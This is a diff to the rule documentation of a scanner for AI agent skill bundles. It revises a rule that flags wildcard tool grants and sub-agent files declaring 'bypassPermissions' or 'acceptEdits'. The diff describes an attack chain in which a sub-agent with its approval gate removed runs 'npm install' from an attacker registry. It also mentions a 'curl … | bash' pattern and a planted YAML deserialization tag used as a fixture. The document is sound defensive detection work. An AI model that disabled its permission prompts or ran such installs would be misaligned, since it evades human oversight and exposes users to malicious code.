@@ -1262,11 +1262,37 @@ case, and an ordinary ```` ```bash ```` block containing `curl … | bash` that 
 - **Confidence:** missing required field 0.9 (deterministic); unknown top-level key 0.3.
 - **Fixtures:** TP: SKILL.md with no `description`. FP: SKILL.md with `metadata: {author: x, custom: y}`.
 
-### SG-MTA-003 — Over-broad / missing allowed-tools  (AST03, high) — **implemented** (`core-metadata`)  [SkillSpector LP2/LP3]
-- **Signals:** `allowed-tools` containing `*`, `all`, `Bash(*)`, unrestricted `Bash` with no command scoping; OR **no** `allowed-tools` while scripts clearly execute commands/network (capability inferred from code — LP3).
-- **FP carve-outs:** a genuinely broad-purpose skill may need broad tools — flag, don't fail; let policy decide. Scoped forms (`Bash(git:*)`) are the *good* case → never flag.
-- **Confidence:** wildcard 0.85; missing-but-capabilities-detected 0.7.
-- **Fixtures:** TP: `allowed-tools: ["Bash(*)"]`. FP: `allowed-tools: ["Bash(jq:*)","Read"]`.
+### SG-MTA-003 — Over-broad tool grant or disabled permission gate  (AST03, high) — **implemented** (`core-metadata`)  [SkillSpector LP2/LP3]
+- **Signals:** `allowed-tools` containing `*`, `all`, or `Bash(*)`; **and** a bundled sub-agent
+  definition that declares `permissionMode: bypassPermissions` (0.9) or `acceptEdits` (0.75).
+- **Why the permission-mode leaf is not just another over-broad grant.** `Bash(*)` is a wide permission
+  the user still approves; `permissionMode: bypassPermissions` is the **removal of the approval** — the
+  sub-agent runs its tools with no prompt at all. Reversec's chain ships exactly that file and then has
+  the sub-agent run `npm install --registry http://attacker/`, after which the agent has no visibility
+  of what executed. `acceptEdits` is a separate, lower-confidence leaf because it auto-approves file
+  *writes* only, a narrower escape.
+- **Targets are `manifest` + `configs`.** The rule declared `manifest` only, so a bundle could carry the
+  declaration in a second file — `.claude/agents/<name>.md` — and scan clean. Verified before the fix:
+  that bundle scanned `pass` / 0 findings. Verified that the file is *already read*: a planted
+  `!!python/object` tag inside it fires `SG-MTA-001`, because `pkg/skill/skill.go:338` files any
+  `.claude/` path as a config. So the miss was the target list, nothing structural. **Do not key on the
+  `.claude/agents/` path** — 2 corpus bundles mention it as ordinary prose; key on the value.
+- **A latent bug in the wildcard leaf, found while adding the above.** The pattern ended
+  `(\*|all)\b`, and `\b` applied to the whole alternation: `*` is not a word character, so there is no
+  word boundary after it and **`allowed-tools: *` never matched** — the canonical over-broad grant this
+  rule is named for. Verified on `68690d5`: `allowed-tools: *` and `allowed-tools: ["*"]` both scanned
+  clean while `allowed-tools: all` fired. Fixed by binding the boundary to the `all` branch only
+  (`\*|all\b`), which still keeps `allowlist` out. Same class as `SG-MTA-001`'s suppress bug (§ above):
+  **a regex detail silently disabling the rule's most important case, with nothing failing to say so.**
+- **FP carve-outs:** scoped grants (`Bash(git:*)`, `Read, Write`) and the restrictive modes
+  (`default`, `plan`, `ask`) stay clean, as does a TypeScript `PermissionMode` type declaration.
+- **Confidence:** `Bash(*)` 0.85; `allowed-tools: *|all` 0.8; `bypassPermissions` 0.9; `acceptEdits` 0.75.
+- **Corpus:** measured before the change across the 109 config-role files — `permissionMode:\s*bypass*`
+  **0**, and both existing leaves **0** in configs, so extending the target list is free.
+- **Fixtures:** `TestPermissionGateDisabledCovered` in `pkg/rules/rules_test.go` (8 TP incl. all three
+  wildcard forms + 6 benign); bundle fixture `testdata/malicious/.claude/agents/installer.md`, asserted
+  by `TestMaliciousFixtureTriggersPermissionGateDisabled`, which pins the *file* as well as the rule so
+  a future target-list regression fails.
 
 ### SG-MTA-004 — Over-broad filesystem permission scope  (AST03, medium) — **implemented** (`core-metadata`)
 - **Threat:** the file-scope sibling of `SG-MTA-003` (over-broad *tool* grant). A manifest that
